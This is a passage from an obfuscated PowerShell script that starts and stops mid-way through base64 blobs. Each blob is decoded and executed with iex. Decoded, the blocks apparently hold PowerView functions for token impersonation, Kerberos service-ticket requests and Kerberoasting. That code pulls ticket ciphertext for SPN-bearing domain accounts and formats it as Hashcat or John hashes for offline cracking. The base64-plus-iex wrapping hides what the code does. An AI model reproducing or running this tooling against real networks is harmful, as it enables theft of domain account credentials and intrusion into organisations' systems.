HV0ZXJOYW1lXElQQyQiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRQYXRocyArPSAsJFBhdGgKICAgICAgICB9CiAgICAgICAgRm9yRWFjaCAoJFRhcmdldFBhdGggaW4gJFBhdGhzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbl0gQXR0ZW1wdGluZyB0byB1bm1vdW50OiAkVGFyZ2V0UGF0aCIKICAgICAgICAgICAgJFJlc3VsdCA9ICRNcHI6OldOZXRDYW5jZWxDb25uZWN0aW9uMigkVGFyZ2V0UGF0aCwgMCwgJFRydWUpCiAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICIkVGFyZ2V0UGF0aCBzdWNjZXNzZnVsbHkgdW1tb3VudGVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgVGhyb3cgIltSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbl0gZXJyb3IgdW5tb3VudGluZyAkVGFyZ2V0UGF0aCA6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0kUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIHsKICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0NyZWRlbnRpYWwnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ3JlZGVudGlhbCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnVG9rZW5IYW5kbGUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkVG9rZW5IYW5kbGUsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUXVpZXQKICAgICkKICAgIGlmICgoW1N5c3RlbS5UaHJlYWRpbmcuVGhyZWFkXTo6Q3VycmVudFRocmVhZC5HZXRBcGFydG1lbnRTdGF0ZSgpIC1uZSAnU1RBJykgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1F1aWV0J10pKSB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gcG93ZXJzaGVsbC5leGUgaXMgbm90IGN1cnJlbnRseSBpbiBhIHNpbmdsZS10aHJlYWRlZCBhcGFydG1lbnQgc3RhdGUsIHRva2VuIGltcGVyc29uYXRpb24gbWF5IG5vdCB3b3JrLiIKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Rva2VuSGFuZGxlJ10pIHsKICAgICAgICAkTG9nb25Ub2tlbkhhbmRsZSA9ICRUb2tlbkhhbmRsZQogICAgfQogICAgZWxzZSB7CiAgICAgICAgJExvZ29uVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICROZXR3b3JrQ3JlZGVudGlhbCA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkKICAgICAgICAkVXNlckRvbWFpbiA9ICROZXR3b3JrQ3JlZGVudGlhbC5Eb21haW4KICAgICAgICAkVXNlck5hbWUgPSAkTmV0d29ya0NyZWRlbnRpYWwuVXNlck5hbWUKICAgICAgICBXcml0ZS1XYXJuaW5nICJbSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uXSBFeGVjdXRpbmcgTG9nb25Vc2VyKCkgd2l0aCB1c2VyOiAkKCRVc2VyRG9tYWluKVwkKCRVc2VyTmFtZSkiCiAgICAgICAgJFJlc3VsdCA9ICRBZHZhcGkzMjo6TG9nb25Vc2VyKCRVc2VyTmFtZSwgJFVzZXJEb21haW4sICROZXR3b3JrQ3JlZGVudGlhbC5QYXNzd29yZCwgOSwgMywgW3JlZl0kTG9nb25Ub2tlbkhhbmRsZSk7JExhc3RFcnJvciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCk7CiAgICAgICAgaWYgKC1ub3QgJFJlc3VsdCkgewogICAgICAgICAgICB0aHJvdyAiW0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gTG9nb25Vc2VyKCkgRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikuTWVzc2FnZSkiCiAgICAgICAgfQogICAgfQogICAgJFJlc3VsdCA9ICRBZHZhcGkzMjo6SW1wZXJzb25hdGVMb2dnZWRPblVzZXIoJExvZ29uVG9rZW5IYW5kbGUpCiAgICBpZiAoLW5vdCAkUmVzdWx0KSB7CiAgICAgICAgdGhyb3cgIltJbnZva2UtVXNlckltcGVyc29uYXRpb25dIEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyKCkgRXJyb3I6ICQoKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikuTWVzc2FnZSkiCiAgICB9CiAgICBXcml0ZS1WZXJib3NlICJbSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uXSBBbHRlcm5hdGUgY3JlZGVudGlhbHMgc3VjY2Vzc2Z1bGx5IGltcGVyc29uYXRlZCIKICAgICRMb2dvblRva2VuSGFuZGxlCn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLVJldmVydFRvU2VsZiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbCgpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFRva2VuSGFuZGxlCiAgICApCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb2tlbkhhbmRsZSddKSB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydGluZyB0b2tlbiBpbXBlcnNvbmF0aW9uIGFuZCBjbG9zaW5nIExvZ29uVXNlcigpIHRva2VuIGhhbmRsZSIKICAgICAgICAkUmVzdWx0ID0gJEtlcm5lbDMyOjpDbG9zZUhhbmRsZSgkVG9rZW5IYW5kbGUpCiAgICB9CiAgICAkUmVzdWx0ID0gJEFkdmFwaTMyOjpSZXZlcnRUb1NlbGYoKTskTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKTsKICAgIGlmICgtbm90ICRSZXN1bHQpIHsKICAgICAgICB0aHJvdyAiW0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydFRvU2VsZigpIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgfQogICAgV3JpdGUtVmVyYm9zZSAiW0ludm9rZS1SZXZlcnRUb1NlbGZdIFRva2VuIGltcGVyc29uYXRpb24gc3VjY2Vzc2Z1bGx5IHJldmVydGVkIgp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNQTlRpY2tldCB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlNQTlRpY2tldCcpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnUmF3U1BOJyldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFBhcmFtZXRlclNldE5hbWUgPSAnUmF3U1BOJywgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oJy4qLy4qJyldCiAgICAgICAgW0FsaWFzKCdTZXJ2aWNlUHJpbmNpcGFsTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkU1BOLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXInLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsgJF8uUFNPYmplY3QuVHlwZU5hbWVzWzBdIC1lcSAnUG93ZXJWaWV3LlVzZXInIH0pXQogICAgICAgIFtPYmplY3RbXV0KICAgICAgICAkVXNlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0pvaG4nLCAnSGFzaGNhdCcpXQogICAgICAgIFtBbGlhcygnRm9ybWF0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0cHV0Rm9ybWF0ID0gJ0hhc2hjYXQnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICROdWxsID0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCdTeXN0ZW0uSWRlbnRpdHlNb2RlbCcpCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlciddKSB7CiAgICAgICAgICAgICRUYXJnZXRPYmplY3QgPSAkVXNlcgogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFRhcmdldE9iamVjdCA9ICRTUE4KICAgICAgICB9CiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkVGFyZ2V0T2JqZWN0KSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXInXSkgewogICAgICAgICAgICAgICAgJFVzZXJTUE4gPSAkT2JqZWN0LlNlcnZpY2VQcmluY2lwYWxOYW1lCiAgICAgICAgICAgICAgICAkU2FtQWNjb3VudE5hbWUgPSAkT2JqZWN0LlNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZE5hbWUgPSAkT2JqZWN0LkRpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVXNlclNQTiA9ICRPYmplY3QKICAgICAgICAgICAgICAgICRTYW1BY2NvdW50TmFtZSA9ICdVTktOT1dOJwogICAgICAgICAgICAgICAgJERpc3Rpbmd1aXNoZWROYW1lID0gJ1VOS05PV04nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRVc2VyU1BOIC1pcyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlJlc3VsdFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uXSkgewogICAgICAgICAgICAgICAgJFVzZXJTUE4gPSAkVXNlclNQTlswXQogICAgICAgICAgICB9CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkVGlja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMuS2VyYmVyb3NSZXF1ZXN0b3JTZWN1cml0eVRva2VuIC1Bcmd1bWVudExpc3QgJFVzZXJTUE4KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpblNQTlRpY2tldF0gRXJyb3IgcmVxdWVzdGluZyB0aWNrZXQgZm9yIFNQTiAnJFVzZXJTUE4nIGZyb20gdXNlciAnJERpc3Rpbmd1aXNoZWROYW1lJyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkVGlja2V0KSB7CiAgICAgICAgICAgICAgICAkVGlja2V0Qnl0ZVN0cmVhbSA9ICRUaWNrZXQuR2V0UmVxdWVzdCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUaWNrZXRCeXRlU3RyZWFtKSB7CiAgICAgICAgICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJFRpY2tldEhleFN0cmVhbSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFRpY2tldEJ5dGVTdHJlYW0pIC1yZXBsYWNlICctJwogICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTYW1BY2NvdW50TmFtZScgJFNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0Rpc3Rpbmd1aXNoZWROYW1lJyAkRGlzdGluZ3Vpc2hlZE5hbWUKICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2VydmljZVByaW5jaXBhbE5hbWUnICRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUKICAgICAgICAgICAgICAgIGlmKCRUaWNrZXRIZXhTdHJlYW0gLW1hdGNoICdhMzgyLi4uLjMwODIuLi4uQTAwMzAyMDEoPzxFdHlwZUxlbj4uLilBMS57MSw0fS4uLi4uLi5BMjgyKD88Q2lwaGVyVGV4dExlbj4uLi4uKS4uLi4uLi4uKD88RGF0YVRvRW5kPi4rKScpIHsKICAgICAgICAgICAgICAgICAgICAkRXR5cGUgPSBbQ29udmVydF06OlRvQnl0ZSggJE1hdGNoZXMuRXR5cGVMZW4sIDE2ICkKICAgICAgICAgICAgICAgICAgICAkQ2lwaGVyVGV4dExlbiA9IFtDb252ZXJ0XTo6VG9VSW50MzIoJE1hdGNoZXMuQ2lwaGVyVGV4dExlbiwgMTYpLTQKICAgICAgICAgICAgICAgICAgICAkQ2lwaGVyVGV4dCA9ICRNYXRjaGVzLkRhdGFUb0VuZC5TdWJzdHJpbmcoMCwkQ2lwaGVyVGV4dExlbioyKQogICAgICAgICAgICAgICAgICAgIGlmKCRNYXRjaGVzLkRhdGFUb0VuZC5TdWJzdHJpbmcoJENpcGhlclRleHRMZW4qMiwgNCkgLW5lICdBNDgyJykgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciBwYXJzaW5nIGNpcGhlcnRleHQgZm9yIHRoZSBTUE4gICQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkuIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVxIgogICAgICAgICAgICAgICAgICAgICAgICAkSGFzaCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGlja2V0Qnl0ZUhleFN0cmVhbScgKFtCaXRjb252ZXJ0ZXJdOjpUb1N0cmluZygkVGlja2V0Qnl0ZVN0cmVhbSkuUmVwbGFjZSgnLScsJycpKQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRIYXNoID0gIiQoJENpcGhlclRleHQuU3Vic3RyaW5nKDAsMzIpKWAkJCgkQ2lwaGVyVGV4dC5TdWJzdHJpbmcoMzIpKSIKICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUaWNrZXRCeXRlSGV4U3RyZWFtJyAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiVW5hYmxlIHRvIHBhcnNlIHRpY2tldCBzdHJ1Y3R1cmUgZm9yIHRoZSBTUE4gICQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSkuIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVxIgogICAgICAgICAgICAgICAgICAgICRIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RpY2tldEJ5dGVIZXhTdHJlYW0nIChbQml0Y29udmVydGVyXTo6VG9TdHJpbmcoJFRpY2tldEJ5dGVTdHJlYW0pLlJlcGxhY2UoJy0nLCcnKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKCRIYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRPdXRwdXRGb3JtYXQgLW1hdGNoICdKb2huJykgewogICAgICAgICAgICAgICAgICAgICAgICAkSGFzaEZvcm1hdCA9ICJgJGtyYjV0Z3NgJCQoJFRpY2tldC5TZXJ2aWNlUHJpbmNpcGFsTmFtZSk6JEhhc2giCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJERpc3Rpbmd1aXNoZWROYW1lIC1uZSAnVU5LTk9XTicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJERpc3Rpbmd1aXNoZWROYW1lLlN1YlN0cmluZygkRGlzdGluZ3Vpc2hlZE5hbWUuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJ1VOS05PV04nCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2hGb3JtYXQgPSAiYCRrcmI1dGdzYCQkKCRFdHlwZSlgJCokU2FtQWNjb3VudE5hbWVgJCRVc2VyRG9tYWluYCQkKCRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUpKmAkJEhhc2giCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSGFzaCcgJEhhc2hGb3JtYXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlNQTlRpY2tldCcpCiAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUtlcmJlcm9hc3QgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU1BOVGlja2V0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0pvaG4nLCAnSGFzaGNhdCcpXQogICAgICAgIFtBbGlhcygnRm9ybWF0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0cHV0Rm9ybWF0ID0gJ0hhc2hjYXQnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRVc2VyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnU1BOJyA9ICRUcnVlCiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxzZXJ2aWNlcHJpbmNpcGFsbmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJElkZW50aXR5IH0KICAgICAgICBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgV2hlcmUtT2JqZWN0IHskXy5zYW1hY2NvdW50bmFtZSAtbmUgJ2tyYnRndCd9IHwgR2V0LURvbWFpblNQTlRpY2tldCAtT3V0cHV0Rm9ybWF0ICRPdXRwdXRGb3JtYXQKICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVBhdGhBY2wgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRmlsZUFDTCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdGdWxsTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBmdW5jdGlvbiBDb252ZXJ0LUZpbGVSaWdodCB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW0ludF0KIC